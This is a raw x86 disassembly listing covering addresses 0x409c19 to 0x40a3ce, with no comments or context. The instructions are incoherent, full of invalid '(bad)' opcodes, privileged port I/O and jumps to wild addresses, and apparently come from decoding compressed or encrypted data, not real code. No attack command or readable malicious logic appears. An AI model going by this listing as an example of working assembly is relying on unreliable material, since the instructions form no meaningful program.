  409c19:	call   DWORD PTR gs:[edi-0x588fe792]
  409c20:	scas   eax,DWORD PTR es:[edi]
  409c21:	sbb    DWORD PTR [esi-0x22baeb7a],ecx
  409c27:	adc    DWORD PTR [bp+di],ebp
  409c2a:	jnp    0x409c7d
  409c2c:	adc    al,0x47
  409c2e:	lods   eax,DWORD PTR ds:[esi]
  409c2f:	add    eax,0xa3f0af0
  409c34:	dec    esi
  409c35:	ror    BYTE PTR [edi-0x405c0b82],0xa8
  409c3c:	mov    ch,0xfe
  409c3e:	ja     0x409c9f
  409c40:	cld    
  409c41:	loop   0x409c5a
  409c43:	(bad)  [ecx+0x31]
  409c46:	adc    DWORD PTR [esi-0x55],0xffffffc5
  409c4a:	addr16 aas 
  409c4c:	sti    
  409c4d:	pop    ecx
  409c4e:	scas   al,BYTE PTR es:[edi]
  409c4f:	pop    ebp
  409c50:	mov    ebx,0xf0be17c6
  409c55:	add    eax,0xebfc1084
  409c5a:	jg     0x409c59
  409c5c:	outs   dx,DWORD PTR ds:[esi]
  409c5d:	clc    
  409c5e:	int3   
  409c5f:	addr16 ds ret 
  409c62:	(bad)  
  409c64:	sti    
  409c65:	jg     0x409c06
  409c67:	jae    0x409c50
  409c69:	into   
  409c6a:	jno    0x409c5f
  409c6c:	(bad)  
  409c6d:	xor    eax,0xdab4d68c
  409c72:	sbb    eax,0xb792e537
  409c77:	in     eax,0xb3
  409c79:	stc    
  409c7a:	mov    WORD PTR [ebx+ecx*8],?
  409c7d:	mov    esp,0x766c1009
  409c82:	inc    ebx
  409c83:	test   eax,0x4679f30d
  409c88:	xchg   esi,eax
  409c89:	gs cs and edi,eax
  409c8d:	fwait
  409c8e:	adc    eax,DWORD PTR [edx+0x50]
  409c91:	imul   eax,DWORD PTR [eax],0x77
  409c94:	xchg   edx,eax
  409c95:	jnp    0x409ce8
  409c97:	hlt    
  409c98:	push   ebp
  409c99:	add    DWORD PTR gs:[eax+esi*2-0x6db6bf37],edx
  409ca1:	push   esp
  409ca2:	or     ah,BYTE PTR [edx-0x53]
  409ca5:	inc    ebp
  409ca6:	or     dh,BYTE PTR [edi+0x58c1f01a]
  409cac:	popa   
  409cad:	ins    DWORD PTR es:[edi],dx
  409cae:	adc    BYTE PTR [eax+eiz*4],0x94
  409cb2:	inc    esp
  409cb3:	dec    edx
  409cb4:	and    DWORD PTR [eax],0x76c0d650
  409cba:	ror    BYTE PTR [edx],0xe7
  409cbd:	(bad)  
  409cbe:	nop
  409cbf:	add    bh,BYTE PTR [edx]
  409cc1:	in     eax,dx
  409cc2:	test   BYTE PTR [ebp+0x2bb74241],cl
  409cc8:	cwde   
  409cc9:	int    0xd
  409ccb:	mov    edx,0xa74b60d4
  409cd0:	nop
  409cd1:	and    al,BYTE PTR [ecx]
  409cd3:	cdq    
  409cd4:	add    dl,dl
  409cd6:	test   edx,0x222bef71
  409cdc:	and    eax,0x5aee0bb5
  409ce1:	cmc    
  409ce2:	out    dx,al
  409ce3:	stos   DWORD PTR es:[edi],eax
  409ce4:	(bad)  
  409ce5:	sti    
  409ce6:	dec    ebp
  409ce7:	cmp    edi,DWORD PTR [edi+0x24288152]
  409ced:	call   0x1a3f0c1
  409cf2:	(bad)  
  409cf3:	sub    edi,DWORD PTR [esp+eiz*8+0xa]
  409cf7:	stos   DWORD PTR es:[edi],eax
  409cf8:	pop    eax
  409cf9:	inc    ebx
  409cfa:	jl     0x409d39
  409cfc:	jmp    0x1e923ad9
  409d01:	nop
  409d02:	test   DWORD PTR [edi-0x60cf2fdd],ebx
  409d08:	or     ebx,DWORD PTR [edi]
  409d0a:	or     eax,0xb540a670
  409d0f:	call   0xcc3f:0x3a50b082
  409d16:	lea    ebp,[ebx-0x51]
  409d19:	ror    BYTE PTR [ebp+0x6f],cl
  409d1c:	repz sar BYTE PTR [ecx-0x4d34d7f9],0xf2
  409d24:	faddp  st(7),st
  409d26:	and    esp,edx
  409d28:	loop   0x409d3a
  409d2a:	pusha  
  409d2b:	or     al,0x0
  409d2d:	icebp  
  409d2e:	mov    ebx,0xd184924c
  409d33:	push   0xe63c78c4
  409d38:	mov    edi,DWORD PTR [edi-0xc]
  409d3b:	sbb    al,0x99
  409d3d:	out    dx,al
  409d3e:	repz rol BYTE PTR [ebx-0x71],1
  409d42:	xor    edx,ebx
  409d44:	cmp    cl,BYTE PTR [ebp+0x7f]
  409d47:	mov    eax,0x785a4a83
  409d4c:	pop    ss
  409d4d:	adc    esi,DWORD PTR ds:0xb576242b
  409d53:	inc    esp
  409d54:	(bad)  
  409d55:	sbb    al,BYTE PTR [ebx+0x99352c1]
  409d5b:	(bad)  
  409d5c:	aaa    
  409d5d:	mov    dh,0x7
  409d5f:	and    bl,BYTE PTR [ebx+0x39]
  409d62:	add    bl,ah
  409d64:	sbb    al,0x80
  409d66:	shl    bh,cl
  409d68:	add    al,ch
  409d6a:	xchg   edx,eax
  409d6b:	push   esp
  409d6c:	int3   
  409d6d:	nop
  409d6e:	inc    edx
  409d6f:	mov    ds:0x4fa07d75,al
  409d74:	int3   
  409d75:	pop    esi
  409d76:	(bad)  
  409d77:	jecxz  0x409d6a
  409d79:	stos   BYTE PTR es:[edi],al
  409d7a:	popa   
  409d7b:	rol    BYTE PTR [eax],0x6f
  409d7e:	std    
  409d7f:	cli    
  409d80:	scas   eax,DWORD PTR es:[edi]
  409d81:	(bad)  
  409d82:	jp     0x409d5d
  409d84:	fdivr  QWORD PTR [eax+0x3f]
  409d87:	in     al,0x58
  409d89:	add    BYTE PTR [eax],ah
  409d8b:	test   al,bh
  409d8d:	lahf   
  409d8e:	lods   al,BYTE PTR ds:[esi]
  409d8f:	mov    ch,0xed
  409d91:	shr    DWORD PTR [eax-0x3c],1
  409d94:	jo     0x409dce
  409d96:	in     al,0xf0
  409d98:	lock adc BYTE PTR [ecx],ch
  409d9b:	and    eax,0xfeeffb7f
  409da0:	cmp    eax,0xbf018306
  409da5:	(bad)  
  409da6:	stos   DWORD PTR es:[edi],eax
  409da7:	mov    edi,0xe13264c2
  409dac:	fidiv  DWORD PTR [ebp+0x6ff6fc6b]
  409db2:	push   DWORD PTR [esi]
  409db4:	mov    edi,0xcbbfbbfb
  409db9:	aas    
  409dba:	jmp    edi
  409dbc:	call   FWORD PTR [edi+ecx*4-0x9961383]
  409dc3:	div    dh
  409dc5:	sub    edx,esi
  409dc7:	mov    ecx,gs
  409dc9:	in     al,0x90
  409dcb:	and    cl,bh
  409dcd:	cmp    eax,0xbe942fca
  409dd2:	sub    BYTE PTR [ebx+esi*4],dh
  409dd5:	stc    
  409dd6:	pushf  
  409dd7:	jns    0x409d6f
  409dd9:	jnp    0x409dff
  409ddb:	je     0x409d72
  409ddd:	mov    ah,0x68
  409ddf:	or     bh,al
  409de1:	mov    ds:0xbb9277f6,eax
  409de6:	add    DWORD PTR [ebx-0x38],0x5ab5eac6
  409ded:	test   BYTE PTR [eax+eiz*4],al
  409df0:	jo     0x409e21
  409df2:	xchg   ebx,eax
  409df3:	pop    ecx
  409df4:	shl    ecx,0xd4
  409df7:	sub    DWORD PTR [ecx+0x202f2e14],ebp
  409dfd:	dec    esp
  409dfe:	and    DWORD PTR [ebp-0xd],edx
  409e01:	in     al,dx
  409e02:	pop    edx
  409e03:	ror    BYTE PTR [edx+0x4d2ffb2a],0x5
  409e0a:	std    
  409e0b:	pop    esi
  409e0c:	dec    edx
  409e0d:	scas   eax,DWORD PTR es:[edi]
  409e0e:	fwait
  409e0f:	xor    BYTE PTR [esi],bh
  409e11:	sub    al,0xc8
  409e13:	ret    
  409e14:	xor    BYTE PTR [ecx+0xc],ah
  409e17:	fadd   st,st(2)
  409e19:	jne    0x409e38
  409e1b:	inc    edx
  409e1c:	js     0x409e79
  409e1e:	pop    ebx
  409e1f:	loope  0x409e9b
  409e21:	(bad)  
  409e22:	(bad)  
  409e23:	cmp    eax,0x96589ee6
  409e28:	ret    
  409e29:	jnp    0x409e78
  409e2b:	push   ss
  409e2c:	adc    dl,cl
  409e2e:	adc    DWORD PTR [ebp-0x5dff0595],edx
  409e34:	std    
  409e35:	inc    edi
  409e36:	cmp    dl,BYTE PTR [edx]
  409e38:	jecxz  0x409df6
  409e3a:	xor    al,0x1d
  409e3d:	ret    0x41ec
  409e40:	(bad)  
  409e41:	pop    edx
  409e42:	(bad)  
  409e43:	shl    BYTE PTR [esp+esi*8+0x7f3805eb],cl
  409e4a:	inc    eax
  409e4b:	push   ecx
  409e4c:	pop    eax
  409e4d:	je     0x409e78
  409e4f:	rol    BYTE PTR [esi],1
  409e51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e52:	mov    ch,0x9e
  409e54:	cmp    BYTE PTR [eax+0x6e0f8eeb],bh
  409e5a:	inc    eax
  409e5b:	jno    0x409dde
  409e5d:	(bad)  
  409e5e:	lahf   
  409e5f:	cmp    BYTE PTR [ecx+0x789b7ef6],cl
  409e65:	push   ecx
  409e66:	int3   
  409e67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e68:	mov    ds:0x4d080c7,al
  409e6d:	add    cl,0x60
  409e70:	adc    BYTE PTR [eax],0x82
  409e73:	das    
  409e74:	jle    0x409e6f
  409e76:	jmp    0x409ed4
  409e78:	mov    ebx,0x23e0f25d
  409e7d:	dec    edi
  409e7e:	mov    dl,0xbd
  409e80:	jae    0x409e18
  409e82:	loope  0x409e6c
  409e84:	add    al,0x69
  409e86:	shr    BYTE PTR [ecx-0x552a0f9b],cl
  409e8c:	sub    BYTE PTR [edx-0x741b6a46],ch
  409e92:	inc    esi
  409e93:	xchg   ebp,eax
  409e94:	test   BYTE PTR [esi-0x4f],dh
  409e97:	bound  ebx,QWORD PTR [ebx+0x5c]
  409e9a:	mov    esi,0x8bd00916
  409e9f:	pushf  
  409ea0:	add    BYTE PTR [ecx+eax*2+0x27],ch
  409ea4:	lods   eax,DWORD PTR ds:[esi]
  409ea5:	inc    edi
  409ea6:	mov    ah,0x56
  409ea8:	add    eax,0x6501c1c1
  409eae:	pop    ecx
  409eaf:	test   DWORD PTR cs:[esi-0x5054547f],ebx
  409eb6:	cli    
  409eb7:	into   
  409eb8:	in     eax,0xb8
  409eba:	es inc eax
  409ebc:	iret   
  409ebd:	sbb    bl,al
  409ebf:	leave  
  409ec0:	xchg   ebx,eax
  409ec1:	daa    
  409ec2:	jns    0x409ebe
  409ec4:	jmp    0x7057c70
  409ec9:	(bad)  
  409eca:	xor    eax,0x43fdbdc8
  409ecf:	sahf   
  409ed0:	jl     0x409ec4
  409ed2:	dec    ecx
  409ed3:	scas   al,BYTE PTR es:[edi]
  409ed4:	pop    esi
  409ed5:	mov    ebp,0xcedbedca
  409eda:	popa   
  409edb:	jns    0x409eca
  409edd:	fidiv  DWORD PTR ds:0xf93fc9fe
  409ee3:	daa    
  409ee4:	cld    
  409ee5:	(bad)  
  409ee6:	outs   dx,DWORD PTR ds:[esi]
  409ee7:	std    
  409ee8:	push   ss
  409ee9:	dec    edi
  409eea:	cmp    eax,0x7b0714f5
  409eef:	mov    bh,0xc9
  409ef1:	xor    dh,BYTE PTR [edi]
  409ef3:	fnsave [ecx-0x57]
  409ef6:	xor    eax,0x273a5945
  409efb:	pop    esi
  409efc:	pop    esi
  409efd:	nop
  409efe:	out    0x45,eax
  409f00:	lods   eax,DWORD PTR ds:[esi]
  409f01:	pop    es
  409f02:	cmp    BYTE PTR [esi+0x40121f2d],ch
  409f08:	push   esi
  409f09:	jp     0x409f01
  409f0b:	out    dx,eax
  409f0c:	test   esi,esi
  409f0e:	pop    es
  409f0f:	pop    es
  409f10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f12:	bound  ebx,QWORD PTR [ecx-0x6a]
  409f15:	xor    eax,ebx
  409f17:	pop    eax
  409f18:	lods   al,BYTE PTR ds:[esi]
  409f19:	and    esp,DWORD PTR [edi+0x71]
  409f1c:	and    eax,eax
  409f1e:	stc    
  409f1f:	mov    esp,0x713f7f60
  409f24:	or     al,0x5c
  409f26:	dec    edx
  409f27:	xchg   edi,eax
  409f28:	add    esp,DWORD PTR [eax+0x42aaab5c]
  409f2e:	dec    esp
  409f2f:	sbb    BYTE PTR [eax],dh
  409f31:	jle    0x409f45
  409f33:	push   ecx
  409f34:	(bad)  
  409f36:	xchg   esp,eax
  409f37:	jb     0x409ee2
  409f39:	rol    ebx,0x8d
  409f3c:	push   ss
  409f3d:	pop    es
  409f3e:	jecxz  0x409f1c
  409f40:	mov    cl,0x80
  409f42:	add    BYTE PTR [esi-0x3f083021],0x31
  409f49:	xor    BYTE PTR [eax],cl
  409f4b:	in     eax,0x18
  409f4d:	adc    cl,0x9e
  409f50:	mov    esi,0xbe36161b
  409f55:	stos   BYTE PTR es:[edi],al
  409f56:	iret   
  409f57:	mov    esi,0xb1e16b51
  409f5c:	test   eax,0x2c4db440
  409f61:	scas   al,BYTE PTR es:[edi]
  409f62:	ret    
  409f63:	stos   BYTE PTR es:[edi],al
  409f64:	dec    eax
  409f65:	inc    edx
  409f66:	push   ebp
  409f67:	mov    ds:0x3413c62c,eax
  409f6c:	fld    DWORD PTR [ebp+0x3846e104]
  409f72:	pop    edx
  409f73:	sub    edx,eax
  409f75:	ficom  DWORD PTR [eax+0x2c16a17]
  409f7b:	jb     0x409fbe
  409f7d:	pop    esi
  409f7e:	or     BYTE PTR [edx+0x2d],cl
  409f81:	nop
  409f82:	jle    0x409fc5
  409f84:	mov    DWORD PTR gs:0xdfec26cf,esp
  409f8b:	jp     0x409f1e
  409f8d:	daa    
  409f8e:	push   ds
  409f8f:	jmp    0x98f80e64
  409f94:	int    0x66
  409f96:	xchg   ebp,eax
  409f97:	jecxz  0x409f48
  409f99:	fxch   st(3)
  409f9b:	aaa    
  409f9c:	add    DWORD PTR [eax],esp
  409f9e:	(bad)  
  409f9f:	sbb    eax,0xd3a76798
  409fa4:	loope  0x409ff1
  409fa6:	pop    edi
  409fa7:	(bad)  
  409fa8:	adc    edi,DWORD PTR [esi+0x4e2ddaff]
  409fae:	aas    
  409faf:	lock jle 0x40a028
  409fb2:	dec    esi
  409fb3:	ds enter 0xfb68,0x34
  409fb8:	lods   eax,DWORD PTR ds:[esi]
  409fb9:	dec    esi
  409fba:	fbld   TBYTE PTR ds:0xc7e5e8fa
  409fc0:	stos   BYTE PTR es:[edi],al
  409fc1:	hlt    
  409fc2:	cmp    al,0x6
  409fc4:	cmp    DWORD PTR [eax+0x67],0xf9616090
  409fcb:	out    dx,eax
  409fcc:	inc    edi
  409fcd:	cli    
  409fce:	push   edi
  409fcf:	inc    ebp
  409fd0:	add    DWORD PTR [ecx],0x58
  409fd3:	out    dx,eax
  409fd4:	or     esi,DWORD PTR [eax-0x65bfacf5]
  409fda:	sub    DWORD PTR [edi+0x49247a77],esp
  409fe0:	mov    dh,BYTE PTR [ebp-0x14450ba7]
  409fe6:	in     eax,dx
  409fe7:	jno    0x409fbe
  409fe9:	dec    esp
  409fea:	rcr    BYTE PTR [esi-0x22],0x5c
  409fee:	mov    ch,0xf1
  409ff0:	jle    0x409fba
  409ff2:	cmp    eax,0x3ec7c003
  409ff7:	div    BYTE PTR [ecx-0x21f527ec]
  409ffd:	retf   0x7c2f
  40a000:	loope  0x40a00d
  40a002:	fs pop ecx
  40a004:	inc    esi
  40a005:	mov    edi,0x9fe3e03f
  40a00a:	clc    
  40a00b:	jns    0x40a087
  40a00d:	fnstsw WORD PTR [esi]
  40a00f:	dec    edi
  40a010:	ds stc 
  40a012:	and    al,0x9f
  40a014:	cld    
  40a015:	in     al,0x27
  40a017:	(bad)  
  40a019:	aas    
  40a01a:	loopne 0x409fe1
  40a01c:	pop    ss
  40a01d:	mov    edi,0xbeafabc3
  40a022:	retf   0xafeb
  40a025:	mov    edi,0x97fcbfce
  40a02a:	call   DWORD PTR [edx-0x1d00e81]
  40a030:	add    eax,0xed725979
  40a035:	cli    
  40a036:	int    0x5a
  40a038:	fisubr DWORD PTR ds:0xed447788
  40a03e:	fild   QWORD PTR [ecx-0x539a383e]
  40a044:	jg     0x40a001
  40a046:	add    bh,BYTE PTR [edi+ebp*4-0x12]
  40a04a:	mov    bh,0xe3
  40a04c:	fiadd  DWORD PTR [eax-0x5e]
  40a04f:	adc    al,0x7
  40a051:	pop    es
  40a052:	push   ebx
  40a053:	test   BYTE PTR [edi],0xdc
  40a056:	adc    BYTE PTR [ebp+0x29],dl
  40a059:	pop    ebp
  40a05a:	adc    dl,BYTE PTR [eax-0x758a3d6e]
  40a060:	ss int3 
  40a062:	sub    dl,BYTE PTR [esp+ebp*2]
  40a065:	ja     0x40a068
  40a067:	enter  0xd1aa,0x74
  40a06b:	mov    ebx,0x36a39b09
  40a070:	sti    
  40a071:	pop    es
  40a072:	cmp    ebx,esp
  40a074:	ret    
  40a075:	add    bl,BYTE PTR [ebp-0x3a]
  40a078:	fst    QWORD PTR [edx+0x6c]
  40a07b:	xchg   ebx,eax
  40a07c:	aaa    
  40a07d:	arpl   bx,di
  40a07f:	ficom  WORD PTR [eax+esi*4-0x48]
  40a083:	xor    dl,BYTE PTR [ebp-0x56]
  40a086:	call   0xf121:0x4c712304
  40a08d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a08e:	inc    esp
  40a08f:	ret    0xc7b2
  40a092:	sahf   
  40a093:	cmp    cl,BYTE PTR [eax]
  40a095:	push   esp
  40a096:	mov    edi,0x5405e457
  40a09b:	loopne 0x40a0ad
  40a09d:	stc    
  40a09e:	or     ch,BYTE PTR [edx-0x4e3cf887]
  40a0a4:	inc    ecx
  40a0a5:	sbb    ecx,DWORD PTR [edi+ecx*2-0x7aebedfa]
  40a0ac:	gs ds ja 0x40a0db
  40a0b0:	push   es
  40a0b1:	int    0xe6
  40a0b3:	xchg   BYTE PTR [eax+edx*4+0x75a594],bh
  40a0ba:	sub    DWORD PTR [esi+eax*1],ebp
  40a0bd:	mov    eax,0x9c7bfd75
  40a0c2:	cmp    esp,DWORD PTR ds:0xd51adad8
  40a0c8:	inc    esi
  40a0c9:	clc    
  40a0ca:	lds    edi,FWORD PTR ds:0xbc942c3f
  40a0d0:	cdq    
  40a0d1:	icebp  
  40a0d2:	pop    ss
  40a0d3:	(bad)  
  40a0d4:	daa    
  40a0d5:	dec    ecx
  40a0d6:	ret    0x3870
  40a0d9:	in     al,0x85
  40a0db:	pop    ss
  40a0dc:	pop    esi
  40a0dd:	in     al,0x6b
  40a0df:	iret   
  40a0e0:	mov    esi,0x71e770cc
  40a0e5:	mov    dh,0x4f
  40a0e7:	ds (bad) 
  40a0e9:	(bad)  
  40a0ea:	lock and al,0xad
  40a0ed:	push   esi
  40a0ee:	mov    edi,0xa477b596
  40a0f3:	cmp    eax,0x62d15e1f
  40a0f8:	rcl    DWORD PTR [edx-0x493d9fc7],cl
  40a0fe:	xchg   BYTE PTR [esi-0x2a],cl
  40a101:	into   
  40a102:	sbb    DWORD PTR [ecx+0x3ffc7100],ebx
  40a108:	into   
  40a109:	add    DWORD PTR [eax],edx
  40a10b:	jbe    0x40a0d7
  40a10d:	push   0x55df4ce0
  40a112:	or     al,0x20
  40a114:	cld    
  40a115:	bound  ebx,QWORD PTR ds:[edx]
  40a118:	xor    BYTE PTR [eax-0x4392a929],al
  40a11e:	pop    ds
  40a11f:	jb     0x40a13d
  40a121:	push   es
  40a122:	and    BYTE PTR [ecx-0x5f6847d2],al
  40a128:	mov    ch,0xf6
  40a12a:	xor    DWORD PTR ds:0x61851426,0x2f
  40a131:	aas    
  40a132:	loopne 0x40a113
  40a134:	(bad)  
  40a135:	sti    
  40a136:	inc    eax
  40a138:	into   
  40a139:	into   
  40a13a:	ss aas 
  40a13c:	sti    
  40a13d:	mov    bl,0x3f
  40a13f:	(bad)  
  40a140:	das    
  40a141:	(bad)  
  40a142:	loop   0x40a173
  40a144:	icebp  
  40a145:	int3   
  40a146:	xor    ecx,edi
  40a148:	lock sti 
  40a14a:	mov    edi,0xf6f679ff
  40a14f:	imul   BYTE PTR [eax]
  40a151:	retf   
  40a152:	xchg   edx,eax
  40a153:	jmp    0x79026fcc
  40a158:	inc    edx
  40a159:	xchg   edx,eax
  40a15a:	sub    al,0x53
  40a15c:	mov    ebp,0x4528e4a3
  40a161:	cmp    eax,0xe51fba8a
  40a166:	or     al,0xbc
  40a168:	pop    ss
  40a169:	ror    BYTE PTR [eax],0xdf
  40a16c:	retf   
  40a16d:	mov    ds:0x28924920,al
  40a172:	pop    es
  40a173:	xbegin 0x790604ad
  40a179:	pushf  
  40a17a:	xor    DWORD PTR [ebx+0x12000f0b],ebx
  40a180:	and    DWORD PTR [ebp+0x54],eax
  40a183:	into   
  40a184:	xor    eax,0x5ee9caf4
  40a189:	pop    ebx
  40a18a:	sub    dl,BYTE PTR [edi-0x70]
  40a18d:	es xchg edx,eax
  40a18f:	outs   dx,BYTE PTR ds:[esi]
  40a190:	inc    edi
  40a191:	xor    eax,ebp
  40a193:	and    eax,0x2c8a5ab4
  40a198:	das    
  40a199:	fsub   QWORD PTR [ecx+eiz*4-0x69e28bb5]
  40a1a0:	xor    bh,cl
  40a1a2:	push   0x14
  40a1a4:	lahf   
  40a1a5:	test   al,0xbc
  40a1a7:	jne    0x40a1f5
  40a1a9:	mov    eax,ds:0x7d170902
  40a1ae:	pop    eax
  40a1af:	repnz sub ecx,eax
  40a1b2:	pusha  
  40a1b3:	pop    edx
  40a1b4:	and    al,0xd4
  40a1b6:	inc    edi
  40a1b7:	push   cs
  40a1b8:	push   esi
  40a1b9:	xchg   ebp,eax
  40a1ba:	mov    al,0xf8
  40a1bc:	ins    DWORD PTR es:[edi],dx
  40a1bd:	sub    eax,0x978899b5
  40a1c2:	sbb    al,0x82
  40a1c4:	mov    ebx,esp
  40a1c6:	add    al,0x5b
  40a1c8:	cmp    DWORD PTR [esi+0x7d],esp
  40a1cb:	push   edx
  40a1cc:	push   eax
  40a1cd:	and    esp,edi
  40a1cf:	mov    al,ds:0x58753720
  40a1d4:	pop    edx
  40a1d5:	adc    BYTE PTR [esi],0x82
  40a1d8:	fstp   QWORD PTR [ebx]
  40a1da:	fbld   TBYTE PTR [ebx-0x55]
  40a1dd:	jg     0x40a19f
  40a1df:	inc    ebx
  40a1e0:	setl   BYTE PTR [ecx-0x2cb2c416]
  40a1e7:	xchg   ebp,eax
  40a1e8:	cmp    eax,0x9a2edc7d
  40a1ed:	shl    BYTE PTR [eax+0x18306294],0x70
  40a1f4:	loope  0x40a1d8
  40a1f6:	and    eax,0x9e0fef7e
  40a1fb:	and    eax,0xc4e69f69
  40a200:	jmp    0x9d597b4c
  40a205:	mov    ds:0xac611bd3,al
  40a20a:	pop    esp
  40a20b:	fdivr  QWORD PTR [edx+0x34]
  40a20e:	mov    al,0xb2
  40a210:	data16 (bad) 
  40a212:	sti    
  40a213:	jmp    0xde3b:0xb47e3dae
  40a21a:	pop    eax
  40a21b:	or     esp,DWORD PTR [esi+0x22d502f8]
  40a221:	test   al,0x51
  40a223:	loope  0x40a1ff
  40a225:	cmp    al,0x80
  40a227:	mov    edx,0x398a040e
  40a22c:	inc    edx
  40a22d:	sub    al,0x56
  40a22f:	std    
  40a230:	pop    ecx
  40a231:	inc    ebp
  40a232:	inc    DWORD PTR [ebx-0x4bbd4627]
  40a238:	adc    dl,ah
  40a23a:	pop    ebp
  40a23b:	sbb    DWORD PTR [ecx],ecx
  40a23d:	or     bh,al
  40a23f:	aaa    
  40a240:	add    DWORD PTR [esp+edx*8],esi
  40a243:	jmp    0xa2c336fa
  40a248:	pop    esp
  40a249:	xor    al,0xe0
  40a24b:	repz out 0xcf,eax
  40a24e:	push   ebx
  40a24f:	adc    al,0x5
  40a251:	(bad)  
  40a253:	hlt    
  40a254:	adc    ch,ch
  40a256:	mov    dh,0x9b
  40a258:	and    eax,0xcb3abeb7
  40a25d:	popf   
  40a25e:	xchg   ebp,eax
  40a25f:	(bad)  
  40a260:	in     eax,dx
  40a261:	cmp    ch,bh
  40a263:	out    dx,al
  40a264:	(bad)  
  40a265:	rcr    edi,cl
  40a267:	jmp    0x40a2da
  40a269:	(bad)  
  40a26a:	pop    edx
  40a26b:	out    0x59,al
  40a26d:	out    0x12,al
  40a26f:	(bad)  
  40a270:	and    ah,BYTE PTR [ebp-0x5b6dbf50]
  40a276:	in     al,dx
  40a277:	(bad)  
  40a278:	out    0xd8,eax
  40a27a:	pop    esp
  40a27b:	mov    al,ds:0xa72fce7a
  40a280:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a281:	pop    ds
  40a282:	push   es
  40a283:	dec    esp
  40a284:	pusha  
  40a285:	add    BYTE PTR [ecx-0x6c27782e],dl
  40a28b:	pop    ds
  40a28c:	loop   0x40a2b9
  40a28e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a28f:	mov    al,ds:0xf5e84ed3
  40a294:	push   ebx
  40a295:	fisubr DWORD PTR ds:0x2e9644c5
  40a29b:	cmp    DWORD PTR [ebp+0x78974bc9],esp
  40a2a1:	es jno 0x40a245
  40a2a4:	clc    
  40a2a5:	popw   ss
  40a2a7:	pop    ebp
  40a2a8:	push   edi
  40a2a9:	sub    eax,0x66a965c6
  40a2ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2af:	test   al,0x9c
  40a2b1:	jg     0x40a244
  40a2b3:	adc    DWORD PTR [ecx+0x78],0xffffff96
  40a2b7:	and    BYTE PTR [ebx],dl
  40a2b9:	and    BYTE PTR [ebp-0x50],bl
  40a2bc:	pop    es
  40a2bd:	inc    ebx
  40a2be:	and    ebp,ebx
  40a2c0:	and    eax,0x32222266
  40a2c5:	daa    
  40a2c6:	cld    
  40a2c7:	cmp    eax,0x6245834a
  40a2cc:	mov    ch,0x41
  40a2ce:	xchg   edi,eax
  40a2cf:	outs   dx,BYTE PTR ds:[esi]
  40a2d0:	mov    ds:0x2a0bcd0,al
  40a2d5:	add    BYTE PTR [ebp+0x5a],bl
  40a2d8:	retf   0x3044
  40a2db:	fnstcw WORD PTR [ebp-0x1ea1a4bc]
  40a2e1:	mov    cl,0x47
  40a2e3:	dec    esi
  40a2e4:	mov    al,ds:0x5d52aa94
  40a2e9:	fwait
  40a2ea:	retf   0x547d
  40a2ed:	iret   
  40a2ee:	pop    ds
  40a2ef:	jle    0x40a2f8
  40a2f1:	in     eax,0x9f
  40a2f3:	dec    esp
  40a2f4:	es jl  0x40a2e5
  40a2f7:	idiv   DWORD PTR [esi-0x1a299e36]
  40a2fd:	rol    DWORD PTR [edi-0x22],0xc3
  40a301:	(bad)  
  40a302:	out    0x69,al
  40a304:	cli    
  40a305:	sub    DWORD PTR ds:0xc0dc4884,0xffffff9d
  40a30c:	push   eax
  40a30d:	gs fdivrp st(7),st
  40a310:	pop    ecx
  40a311:	arpl   si,si
  40a313:	lea    edi,[ecx+0xa]
  40a316:	push   edi
  40a317:	cmp    DWORD PTR [ecx],eax
  40a319:	inc    ebp
  40a31a:	mov    ah,0x3f
  40a31c:	scas   al,BYTE PTR es:[edi]
  40a31d:	imul   dl
  40a31f:	adc    eax,0x9917f85
  40a324:	push   ecx
  40a325:	sub    DWORD PTR [edi-0x47],edi
  40a328:	enter  0x801,0x8c
  40a32c:	mov    al,ds:0x70c149f
  40a331:	pop    ebp
  40a332:	dec    edx
  40a333:	mov    ebp,0x7c10023a
  40a338:	add    ecx,ebp
  40a33a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a33b:	int    0xfc
  40a33d:	repz iret 
  40a33f:	jns    0x40a2d8
  40a341:	xchg   BYTE PTR [edx],al
  40a343:	ret    
  40a344:	xor    DWORD PTR [eax],eax
  40a346:	inc    eax
  40a347:	or     BYTE PTR [ecx+0x38a08d80],ah
  40a34d:	xor    DWORD PTR [edx+0x60738515],ecx
  40a353:	add    eax,0x9a230f54
  40a358:	jp     0x40a317
  40a35a:	push   ds
  40a35b:	imul   ebx,DWORD PTR [edx-0x7070e1ce],0x2f74e51c
  40a365:	mov    bh,BYTE PTR [esi-0x41]
  40a368:	retf   0xbde
  40a36b:	sbb    BYTE PTR [eax],ch
  40a36d:	sub    DWORD PTR [ecx+0x52],edx
  40a370:	mov    ds:0xbcf85a95,al
  40a375:	jge    0x40a3af
  40a377:	or     ah,BYTE PTR [ecx-0x47]
  40a37a:	jp     0x40a3f1
  40a37c:	pop    ds
  40a37d:	mov    ds:0xe1008905,eax
  40a382:	ret    
  40a383:	and    cl,0x9c
  40a386:	mov    BYTE PTR [eax+0x215f2190],0x6e
  40a38d:	jns    0x40a40d
  40a38f:	inc    esi
  40a390:	and    BYTE PTR [ebx],cl
  40a392:	lods   eax,DWORD PTR ds:[esi]
  40a393:	xchg   esi,eax
  40a394:	cmp    BYTE PTR fs:[eax+0x19],cl
  40a398:	hlt    
  40a399:	push   ebx
  40a39a:	push   cs
  40a39b:	ud2    
  40a39d:	out    0x5a,al
  40a39f:	arpl   WORD PTR [ebp+0x48],bp
  40a3a2:	xchg   ebp,eax
  40a3a3:	mov    ebp,DWORD PTR [edi+esi*8-0x60]
  40a3a7:	test   BYTE PTR [esi+0x46],dl
  40a3aa:	sub    eax,0x5408057a
  40a3af:	ss mov ecx,0x6c43a5ef
  40a3b5:	stos   BYTE PTR es:[edi],al
  40a3b6:	jmp    0x9bda:0xbe21e3b5
  40a3bd:	add    al,0x85
  40a3bf:	pop    es
  40a3c0:	mov    BYTE PTR [edx],al
  40a3c2:	fs out 0x8e,al
  40a3c5:	(bad)  
  40a3c6:	cmp    edi,ebx
  40a3c8:	mov    WORD PTR [edi],es
  40a3ca:	pop    es
  40a3cb:	ret    0x9b1
  40a3ce:	push   ebp
